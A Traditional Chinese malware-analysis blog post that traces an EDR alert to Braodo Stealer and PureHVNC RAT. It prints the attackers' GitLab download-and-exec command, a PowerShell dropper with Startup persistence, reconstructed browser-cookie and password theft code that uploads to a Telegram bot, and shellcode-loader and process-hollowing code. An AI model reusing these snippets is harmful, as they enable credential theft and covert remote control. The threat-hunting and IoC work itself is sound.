---
title: 從 EDR Log 到反編譯：kiemdev05 惡意軟體完整分析
published: 2026-01-10
description: "一場從 EDR 告警開始的惡意軟體狩獵之旅，歷時八小時手工反編譯 Python bytecode，最終揭開 Braodo Stealer 與 PureHVNC RAT 的真面目"
image: ""
tags: [Malware, Reverse Engineering, Threat Hunting, Python]
category: "Security"
draft: false
lang: "zh-TW"
---

這篇文章記錄了一次完整的惡意軟體分析過程，從 EDR 告警開始，經過鑑識調查、Python bytecode 反編譯，到最終識別出 Braodo Stealer 和 PureHVNC RAT 的完整攻擊鏈。過程中踩了不少坑，也學到很多東西，希望能對同樣在做惡意軟體分析的人有些幫助。

> 想看「完整但去武器化」的程式碼/重現片段，請見附錄：`src/content/spec/kiemdev05-code-appendix.md`（分析用、不含外洩/注入/持久化）。

## 目錄

- [目錄](#目錄)
- [事件起源：EDR 告警](#事件起源edr-告警)
- [初步調查：追蹤感染源](#初步調查追蹤感染源)
- [鑑識分析：還原攻擊流程](#鑑識分析還原攻擊流程)
  - [完整攻擊流程圖](#完整攻擊流程圖)
- [反編譯 sup02.entrypoint：Braodo Stealer](#反編譯-sup02entrypointbraodo-stealer)
  - [Stage 1：解開 marshal](#stage-1解開-marshal)
  - [嘗試各種反編譯工具](#嘗試各種反編譯工具)
    - [decompyle3 / uncompyle6](#decompyle3--uncompyle6)
    - [pycdc](#pycdc)
    - [unpyc37-3.10](#unpyc37-310)
    - [PyLingual](#pylingual)
  - [Stage 2：手工反編譯](#stage-2手工反編譯)
  - [確認是 Braodo Stealer](#確認是-braodo-stealer)
- [反編譯 zk.entrypoint：Process Hollowing](#反編譯-zkentrypointprocess-hollowing)
  - [Stage 1 + Stage 2 解開](#stage-1--stage-2-解開)
  - [程式碼分析](#程式碼分析)
  - [提取內嵌 payload](#提取內嵌-payload)
- [分析 Wmuxwilb.exe：PureHVNC RAT](#分析-wmuxwilbexepurehvnc-rat)
  - [使用 ILSpy 反編譯](#使用-ilspy-反編譯)
  - [解混淆](#解混淆)
  - [Mkvsokp.dll 分析](#mkvsokpdll-分析)
  - [提取 C2 資訊](#提取-c2-資訊)
  - [確認是 PureHVNC](#確認是-purehvnc)
- [攻擊者溯源](#攻擊者溯源)
  - [Telegram Bot 資訊](#telegram-bot-資訊)
  - [C2 伺服器](#c2-伺服器)
  - [其他關聯](#其他關聯)
- [IoC 彙整](#ioc-彙整)
  - [攻擊指令](#攻擊指令)
  - [檔案路徑](#檔案路徑)
  - [網路 IoC](#網路-ioc)
  - [Telegram](#telegram)
  - [Hash](#hash)
- [結語](#結語)
- [附錄：去武器化程式碼](#附錄去武器化程式碼)

---

## 事件起源：EDR 告警

某天在看 EDR log 的時候，發現一隻叫 `synaptics.exe` 的程式行為很可疑。它建立了大量 Chrome 的子程式，還連線到好幾個外部 IP，最詭異的是它在偷取瀏覽器密碼後，把資料打包成 zip 檔案：

```text
C:\Users\admin\AppData\Local\Temp\[TW_某IP] 電腦名稱.zip
```

快速瀏覽了一下 EDR 記錄的行為序列：

1. 執行 Python payload `sup02.entrypoint`
2. DNS 解析 `gitlab.com`
3. 連線取得 payload
4. 讀取 Chrome 資料
5. 建立 `login_db`、`All_Passwords.txt` 等檔案
6. `taskkill chrome.exe`
7. 建立 Chrome remote-debug
8. 對 Edge 做一樣的事...
9. DNS 解析 `adsmanager.facebook.com`、`graph.facebook.com`
10. 建立 `Facebook_Cookies.txt`
11. DNS 解析 `ip-api.com` 取得受害者 IP
12. 建立 `[TW_某IP] 電腦名稱.zip`
13. DNS 解析 `api.telegram.org`
14. 將 zip 檔上傳
15. 刪除所有痕跡

整個過程在兩分鐘內完成。這效率真的不錯。

### 時間軸（T0 起算）

> 以下以「`synaptics.exe` 開始執行」作為 T0，依 EDR 行為序列與檔案建立/刪除時間排序整理。  
> 註：沒有精確秒數的事件以區間表示，避免製造不必要的「假精準」。

| 時間（相對） | 事件                                                             | 產物/證據                                            | 相關連線                                                               |
| ------------ | ---------------------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------------------------- |
| T+00s        | `WindowsSecurity.lnk` 觸發 `synaptics.exe`（Python 3.10.11）執行 | 程序樹 / Startup LNK                                 | -                                                                      |
| T+00~10s     | 以 `-c` 拉取並執行 GitLab `sup02.entrypoint`                     | `-c "import requests; exec(requests.get(...).text)"` | `gitlab.com`                                                           |
| T+10~40s     | 讀取/複製瀏覽器資料庫、解密密碼等                                | `%TEMP%\login_db`、`All_Passwords.txt`               | -                                                                      |
| T+20~60s     | 終止瀏覽器並以 headless / remote-debug 方式取得 cookies          | `taskkill`、本機 remote-debug                        | `127.0.0.1:9222`                                                       |
| T+40~80s     | 針對 Facebook cookies 做額外查詢/蒐集（廣告帳戶/資產資訊）       | `Facebook_Cookies.txt`                               | `adsmanager.facebook.com`、`graph.facebook.com`、`mbasic.facebook.com` |
| T+70~90s     | 查詢外網 IP/地區資訊                                             | 事件 log / request                                   | `ip-api.com`                                                           |
| T+90~110s    | 打包資料為 zip（含機器名/國碼/IP）                               | `%TEMP%\[TW_*] {COMPUTERNAME}.zip`                   | -                                                                      |
| T+100~120s   | 透過 Telegram Bot API 上傳 zip                                   | `sendDocument`                                       | `api.telegram.org`                                                     |
| T+110~120s   | 清理痕跡（刪除 txt/db/zip、移除暫存資料夾）                      | 檔案刪除事件                                         | -                                                                      |

## 初步調查：追蹤感染源

往前追溯 EDR log，找到 `explorer.exe` 執行了這段指令：

```powershell
"C:\Users\Public\ChromeApplication\synaptics.exe" -c "import requests;exec(requests.get('https://gitlab.com/blackhat_code/software/-/raw/main/sup02.entrypoint', verify=False).text)"
```

而且這段指令是從 `C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurity.lnk` 執行的，路徑在 Startup 底下，每次開機都會執行。

直接連到受害電腦上看 `C:\Users\Public\ChromeApplication\` 資料夾：

```text
├── DLLs/
├── Lib/
├── definitions.py
├── python310.dll
├── synaptics.exe
└── vcruntime140.dll
```

用 VirusTotal 查了一下 `synaptics.exe`，發現它其實就是 [pythonw.exe](https://www.virustotal.com/gui/file/ff507b25af4b3e43be7e351ec12b483fe46bdbc5656baae6ad0490c20b56e730)，版本 3.10.11。

所以整個攻擊流程是：**用假裝成系統程式的 Python 執行器，從 GitLab 下載惡意 payload 執行。**

## 鑑識分析：還原攻擊流程

查看 GitLab 上的 `sup02.entrypoint`，看到主程式經過混淆：

```python
exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b85decode("c%1Cm*|PH5ognzVzu}zY<71~YU3R9OlSzhTNU|hA48c4|3_=1lf}#u11PBcXNq`VTbcC~_>!u^R-XQZb-=d$OE-N~|H*h~fU$yo=$LTD0boUFaO~CpgmZUXn{kQz`M}Oah?^gJB|L6by`V#y..."))))
```

經典的 base85 + zlib + marshal 組合技。

> 解包與輸出 disassembly 的「去武器化」示例，已整理在附錄（不執行 code object）：`src/content/spec/kiemdev05-code-appendix.md`

在 Windows PowerShell event log 中也找到了完整的 PowerShell payload：

```powershell
function Hide-ConsoleWindow() {
    $ShowWindowAsyncCode = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    # ... 隱藏視窗的程式碼
}
Hide-ConsoleWindow

$dst = 'C:\Users\Public\ChromeApplication'
# 建立目錄並解壓縮 rar
Document_Secure\rar.exe x Document_Secure\securedoc.rar "C:\Users\Public\ChromeApplication\" -p"kiemdev05"

$payload = "import requests;exec(requests.get('https://gitlab.com/blackhat_code/software/-/raw/main/sup02.entrypoint', verify=False).text)"

# 建立 WindowsSecurity.lnk 持久化
$link = $obj.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurity.lnk")
$link.TargetPath = "C:\Users\Public\ChromeApplication\synaptics.exe"
$link.Arguments = "-c `"$payload`""
$link.Save()

# 執行 payload
cmd /C start "" "C:\Users\Public\ChromeApplication\synaptics.exe" -c `"$payload`"
```

注意到 rar 的密碼是 `kiemdev05`。

用這個關鍵字搜尋，找到：

1. [StrikeReady Labs 的推文](https://x.com/StrikeReadyLabs/status/1868745455569351087) - 指出此 ID 的使用者可能來自越南
2. [Exetools 論壇](https://forum.exetools.com/showthread.php?p=131221) - 發文者使用相同 ID

後來在反編譯的程式碼中也看到越南文：`statut='Không Rõ Trạng Thái'`（狀態未知），進一步確認攻擊者可能是越南人。

### 完整攻擊流程圖

```text
bat 檔案執行
    ↓
PowerShell 執行 (隱藏視窗)
    ↓
解壓縮 securedoc.rar (密碼: kiemdev05)
    ↓
建立 WindowsSecurity.lnk (持久化)
    ↓
執行 synaptics.exe (pythonw.exe)
    ↓
從 GitLab 下載 sup02.entrypoint
    ↓
執行惡意 Python payload
    ├── 竊取瀏覽器密碼
    ├── 竊取 Cookies
    ├── 竊取信用卡資訊
    ├── 偷取 Facebook 憑證
    └── 上傳至 Telegram Bot
```

---

## 反編譯 sup02.entrypoint：Braodo Stealer

這段是整個分析最耗時的部分。Python bytecode 反編譯聽起來簡單，但實際上踩了無數的坑。

### Stage 1：解開 marshal

首先把 payload 解開：

```python
import marshal, zlib, base64

payload = "c%1Cm*|PH5ognzVzu}zY<71~YU3..."  # 省略
code_object = marshal.loads(zlib.decompress(base64.b85decode(payload)))
print(code_object)
# <code object <module> at 0x7fcfe6063890, file "<string>", line 1>
```

> 若你要保留「完整程式碼」供後續重現，建議只放去武器化版本（不含 exec / exfil / persistence）。我已把可重現的安全版本整理到附錄。

直接執行會遇到 `ValueError: bad marshal data (unknown type code)`，因為 marshal 格式不是跨版本穩定的。測試後發現需要用 Python 3.10 才能正確解析（跟 synaptics.exe 的版本一致）。另外，若要手動修復成 `.pyc` 檔案，還需要補上 Python 3.10 的 Magic Number（例如 `b'\x6f\x0d\x0d\x0a'`）。

用 Docker 建了個 Python 3.10 環境：

```dockerfile
FROM ubuntu:22.04
RUN add-apt-repository ppa:deadsnakes/ppa -y && apt-get update
RUN apt-get install -y python3.10 python3.10-venv python3.10-distutils
RUN ln -s /usr/bin/python3.10 /usr/bin/python
```

### 嘗試各種反編譯工具

### decompyle3 / uncompyle6

```text
# decompyle3 version 3.9.2
# Python bytecode version base 3.10.0 (3439)
# Unsupported Python version, 3.10.0, for decompilation
```

目前主流的 Python decompiler 都只支援到 3.9。

### pycdc

```text
Unsupported opcode: RERAISE (209)
# WARNING: Decompyle incomplete
```

Python 3.10 引入的 `RERAISE` opcode 沒被支援。

### unpyc37-3.10

```text
Exception: Empty stack popped!
```

### PyLingual

線上工具，跑了快一個小時才完成。雖然結果不完整，但至少能看到大部分的程式碼結構。

### Stage 2：手工反編譯

因為自動化工具都不太行，最後決定手工看 dis code 來反編譯。這段工作大概做了八個多小時。

舉幾個例子：

```python
# 120342 LOAD_NAME      3 (os)
# 120344 LOAD_METHOD   44 (getenv)
# 120346 LOAD_CONST    14 ('LOCALAPPDATA')
# 120348 CALL_METHOD    1
# 120350 STORE_NAME    45 (LocalAppData)

# 對應的 Python 程式碼：
LocalAppData = os.getenv('LOCALAPPDATA')
```

```python
# 120386 LOAD_NAME      47 (TMP)
# 120388 FORMAT_VALUE    0
# 120390 LOAD_CONST    18 ('\\')
# 120392 LOAD_NAME       3 (os)
# 120394 LOAD_METHOD    44 (getenv)
# 120396 LOAD_CONST    19 ('COMPUTERNAME')
# 120398 LOAD_CONST    20 ('defaultValue')
# 120400 CALL_METHOD    2
# 120402 FORMAT_VALUE    0
# 120404 BUILD_STRING    3
# 120406 STORE_NAME    50 (Data_Path)

# 對應的 Python 程式碼：
Data_Path = f"{TMP}\\{os.getenv('COMPUTERNAME', 'defaultValue')}"
```

最終還原出來的程式碼結構：

```python
import os, json, base64, sqlite3, shutil, requests, glob, re, zipfile
# ... 更多 import

TOKEN_BOT = '7688244721:AAEuVdGvEt2uIYmzQjJmSJX1JKFud9pr1XI'
CHAT_ID_NEW = '-1002426006531'
CHAT_ID_RESET = '-1002489276039'

ch_dc_browsers = {
    "Chromium": f"{LocalAppData}\\Chromium\\User Data",
    "Chrome": f"{LocalAppData}\\Google\\Chrome\\User Data",
    "Edge": f"{LocalAppData}\\Microsoft\\Edge\\User Data",
    "Brave": f"{LocalAppData}\\BraveSoftware\\Brave-Browser\\User Data",
    "Discord": f'{AppData}\\discord',
    # ... 還有幾十個瀏覽器
}

def get_ch_cookies(browser, path, profile, ch_master_key):
    # 使用 Chrome remote debugging 偷 cookies
    subprocess.run(['taskkill', '/F', '/IM', browser_info['executable']])
    proc = subprocess.Popen([
        browser_info['path'],
        '--remote-debugging-port=9222',
        '--headless',
        # ...
    ])
    ws_url = requests.get('http://localhost:9222/json').json()[0]['webSocketDebuggerUrl']
    # 注意：這裡的 create_connection 來自 websocket client
    # from websocket import create_connection
    ws = create_connection(ws_url)
    ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
    cookies = json.loads(ws.recv())['result']['cookies']
    # ...

class Facebook:
    def Get_info_Tkqc(self):
        # 取得 Facebook 廣告帳戶資訊
        get_tkqc = f'https://graph.facebook.com/v17.0/me/adaccounts?...'
        # ...

# 最後上傳到 Telegram
response = requests.post(
    f"https://api.telegram.org/bot{TOKEN_BOT}/sendDocument",
    params={'chat_id': CHAT_ID, 'caption': message_body},
    files={'document': f},
)
```

### 確認是 Braodo Stealer

根據 [Splunk 的分析](https://www.splunk.com/en_us/blog/security/cracking-braodo-stealer-analyzing-python-malware-and-its-obfuscated-loader.html)，這隻惡意軟體的特徵完全符合 **Braodo Stealer**：

1. ✅ 使用 Telegram Bot 作為 C2 通道
2. ✅ 用 Python 編寫，採用多層混淆
3. ✅ 從瀏覽器竊取憑證、Cookies、信用卡資訊
4. ✅ 利用 GitLab 等平台分發 payload
5. ✅ 專門針對 Facebook 廣告帳戶
6. ✅ 使用 taskkill 終止瀏覽器進程

攻擊者還針對 Facebook 做了特殊處理，會取得廣告帳戶資訊、BM（Business Manager）資訊、Page 資訊等，應該是為了轉賣這些帳號。

---

## 反編譯 zk.entrypoint：Process Hollowing

GitLab 上還有另一隻 `zk.entrypoint`，用同樣的方式解開後發現是完全不同的東西。

### Stage 1 + Stage 2 解開

這個 payload 多了一層 RSA + AES 加密：

```python
def hybrid_decrypt(base85_encoded_data, rsa_private_key):
    compressed_data = base64.b85decode(base85_encoded_data)
    encrypted_data = decompress(compressed_data)
    rsa_encrypted_key = encrypted_data[:256]
    aes_encrypted = encrypted_data[256:]
    combined_key = rsa_decrypt(rsa_encrypted_key, rsa_private_key)
    rc4_key = combined_key[:16]
    xor_key = combined_key[16:32]
    aes_key = combined_key[32:48]
    # ... 三層解密
```

解開後發現是一個 Shellcode Loader + Process Hollowing 的組合。

### 程式碼分析

```python
TARGET_EXE = 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe'

# Local Shellcode Loader (bypass AV)
def shc_loader(base64_encrypted_shellcode):
    shc = rc4(base64.b64decode(base64_encrypted_shellcode), key)
    kernel32 = ctypes.windll.kernel32
    memAddr = kernel32.VirtualAlloc(None, len(shc), 0x3000, 0x40)
    kernel32.RtlMoveMemory(memAddr, shc, len(shc))
    th = kernel32.CreateRemoteThread(...)
    kernel32.WaitForSingleObject(th, -1)

# Process Hollowing
windll.kernel32.CreateProcessA(..., CREATE_SUSPENDED, ...)
# 解析 PE header
pe_payload = pefile.PE(data=payload)
# 寫入 payload sections
for section in pe_payload.sections:
    windll.kernel32.WriteProcessMemory(...)
# Resume thread
windll.kernel32.ResumeThread(process_info.hThread)

# 偵測防毒軟體
if 'AvastUI.exe' in process_list or 'wsc_proxy.exe' in process_list:
    sys.exit()
```

這段程式碼會：

1. 建立 `RegAsm.exe` 的 suspended process
2. 把記憶體中的 PE 用 payload 替換掉
3. Resume 執行

經過一番追蹤，發現程式碼來自這兩個 GitHub 專案：

- Bypass AV: <https://github.com/brosck/Condor/blob/main/template/bypass.py>
- Process Hollowing: <https://github.com/joren485/HollowProcess/blob/main/process-hollowing.py>

### 提取內嵌 payload

把 `payload_base64_encrypted` 解出來：

```python
payload_data_encrypted = base64.b64decode(payload_base64_encrypted)
key = b'ditmethangwindowdefender'  # 笑死這個 key
payload = rc4(payload_data_encrypted, key)
with open('payload.exe', 'wb') as f:
    f.write(payload)
```

得到一個 .NET 執行檔：`PE32 executable (GUI) Intel 80386 Mono/.Net assembly`

---

## 分析 Wmuxwilb.exe：PureHVNC RAT

這隻就是 zk.entrypoint 最終載入的 RAT。

### 使用 ILSpy 反編譯

因為是 .NET 程式，用 ILSpy 打開後看到有大量 AES 加密的資料：

```csharp
internal static byte[] Tmax12Tti() {
    Aes aes = Aes.Create();
    aes.KeySize = 256;
    aes.Key = Convert.FromBase64String("hHWNAEZbkUJzH1yg5JQX2XjFLdl/vQzDM+JJ0l55mrg=");
    aes.IV = Convert.FromBase64String("P7HejvewHEkNp0AcbDP0xg==");
    // 解密 304432 bytes 的資料
}
```

用 Python 把資料解出來：

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
key = base64.b64decode("hHWNAEZbkUJzH1yg5JQX2XjFLdl/vQzDM+JJ0l55mrg=")
iv = base64.b64decode("P7HejvewHEkNp0AcbDP0xg==")
cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
decryptor = cipher.decryptor()
decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
```

解密後發現是 GZIP 壓縮的 DLL：

```text
00000000: 00b4 0b00 1f8b 0800 0000 0000 0400 ecbd
```

前 4 bytes 是長度，後面是 gzip。解壓縮後得到 `Mkvsokp.dll`。

### 解混淆

用 DIE 查看，發現使用了 **.NET Reactor** 混淆。找到 [NETReactorSlayer](https://github.com/SychicBoy/NETReactorSlayer) 這個工具可以解混淆。

解混淆後程式碼清晰多了：

```csharp
public static void Main() {
    Class2.ztfyIbRkN()?.DynamicInvoke();
}

internal static Delegate ztfyIbRkN() {
    return Delegate.CreateDelegate(
        typeof(Action),
        smethod_0(),
        "StopAdvancedWorker"
    );
}
```

原來是動態載入 `Mkvsokp.dll` 並執行 `StopAdvancedWorker` 方法。

### Mkvsokp.dll 分析

這個 DLL 包含大量功能模組：

1. **SetTokenizer** - 竊取加密貨幣錢包

   - MetaMask, TronLink, Phantom 等幾十種錢包
   - 各種瀏覽器擴充功能的 ID

2. **ServiceSet** - 系統資訊收集

   ```csharp
   using ManagementObjectSearcher searcher = new(
       "root\\SecurityCenter2",
       "SELECT * FROM AntiVirusProduct"
   );
   ```

3. **TaskWrapper** - C2 通訊
   - 使用 ProtoBuf 序列化
   - SSL 加密連線

### 提取 C2 資訊

找到設定資料的解析邏輯：

```csharp
TaskWrapper.m_HiddenValue = (EfficientIterator)GeneratorWatcher.GenerateSegmentedGenerator(
    Convert.FromBase64String("H4sIAAAAAAAEAIWTt87s5hVFDbsQYEiGapVq...")
);
```

用 [Protobuf Decoder](https://protobuf-decoder.netlify.app/) 解開後：

| Field | Content          |
| ----- | ---------------- |
| 1     | 38.180.225.150   |
| 2     | 56001            |
| 3     | X509 Certificate |
| 4     | Default          |

**C2 伺服器：38.180.225.150:56001**

### 確認是 PureHVNC

根據 [FortiGuard 的分析](https://www.fortinet.com/blog/threat-research/purehvnc-deployed-via-python-multi-stage-loader)，這隻 RAT 的特徵完全符合 **PureHVNC**：

1. ✅ .NET 程式
2. ✅ AES 解密 payload
3. ✅ 使用 GZIP 壓縮
4. ✅ 動態載入 DLL
5. ✅ 使用 .NET Reactor 混淆
6. ✅ ProtoBuf 序列化 C2 通訊
7. ✅ 針對加密錢包和密碼管理器

---

## 攻擊者溯源

### Telegram Bot 資訊

從 Telegram Bot API 取得資訊：

```text
ID: 7688244721
Name: data ve ne
Username: @data_015_bot

Creator: @senju822222 (ID: 1079398712)
```

用 [telegram-bot-dumper](https://github.com/soxoj/telegram-bot-dumper) 可以監聽 Bot 的活動。

### C2 伺服器

在分析過程中可以觀察到該 C2 主機是 Windows 環境，且對外可見 RDP/SSH 等服務（例如主機名 `DESKTOP-FGUJ4U9`、Windows 10 版本 `10.0.19041`，以及 PureHVNC 使用的 `56001/tcp`）。  
（這裡僅記錄結果與環境特徵，避免把內容寫成可被濫用的操作手冊。）

### 其他關聯

在搜尋過程中發現 `dk8munok987.net` 這個網站有類似的 payload：

```text
Index of /:
├── KiemLua/
├── NamAn/
├── ThieuDo/
│   ├── code.txt (不同的 Telegram Bot Token)
│   ├── Startup.Bat
│   └── installer.msi
└── Python313.zip
```

不同資料夾有不同的 Telegram Bot Token，可能是多個攻擊者共用基礎設施，或是同一個攻擊者針對不同受害者使用不同的收集管道。

---

## IoC 彙整

### 攻擊指令

```powershell
powershell -ep bypass -w hidden -enc ZgB1AG4AYwB0...
```

```bash
"C:\Users\Public\ChromeApplication\synaptics.exe" -c "import requests;exec(requests.get('https://gitlab.com/blackhat_code/software/-/raw/main/sup02.entrypoint', verify=False).text)"
```

### 檔案路徑

```text
C:\Users\Public\ChromeApplication\synaptics.exe
C:\Users\...\Startup\WindowsSecurity.lnk
%TEMP%\login_db
%TEMP%\cards_db
%TEMP%\[TW_IP] ComputerName.zip
%TEMP%\ComputerName\All_Passwords.txt
%TEMP%\ComputerName\Facebook_Cookies.txt
```

### 網路 IoC

| 類型      | 值                                |
| --------- | --------------------------------- |
| C2        | 38.180.225.150:56001              |
| Payload   | gitlab.com/blackhat_code/software |
| Exfil     | api.telegram.org                  |
| IP Lookup | ip-api.com                        |

### Telegram

| 項目            | 值                                             |
| --------------- | ---------------------------------------------- |
| Bot Token       | 7688244721:AAEuVdGvEt2uIYmzQjJmSJX1JKFud9pr1XI |
| Chat ID (New)   | -1002426006531                                 |
| Chat ID (Reset) | -1002489276039                                 |
| Bot Username    | @data_015_bot                                  |
| Owner           | @senju822222                                   |

### Hash

| 檔案         | SHA256                                                           |
| ------------ | ---------------------------------------------------------------- |
| Wmuxwilb.exe | 6dcf1468a9ee9d100ac91bfc0a66a302a55f67711f5f01e55b8eb2561f6a58ec |
| Mkvsokp.dll  | 73b676de725eeaf508e8b1b4028a935d1e3b612a72e7b6712c590ef8cdb8c476 |
| Lakatos.bat  | a97df6a45e872b0305a87405b0fe1fb2f59fa3c9054ac90202dbc0bc600f2830 |

---

## 結語

這次分析從 EDR 告警開始，經過鑑識調查、Python bytecode 手工反編譯（花了八個多小時），最終識別出兩個不同的惡意軟體：

1. **Braodo Stealer** - 針對瀏覽器憑證和 Facebook 廣告帳戶的竊取工具
2. **PureHVNC RAT** - 具有遠端控制功能的木馬，使用 Process Hollowing 技術

攻擊者很可能來自越南，使用 GitLab 和 Telegram 作為基礎設施，主要目標是竊取 Facebook 廣告帳戶和加密貨幣錢包。

整個攻擊鏈設計得相當完整：

- 多層混淆避免靜態分析
- Process Hollowing 避免動態分析
- 偵測防毒軟體
- 執行完畢後刪除所有痕跡

唯一的缺點是用了 `kiemdev05` 這個密碼，讓我們能夠追溯到攻擊者的身份。

下次記得用隨機密碼啊 :)

---

## 附錄：去武器化程式碼

- `src/content/spec/kiemdev05-code-appendix.md`
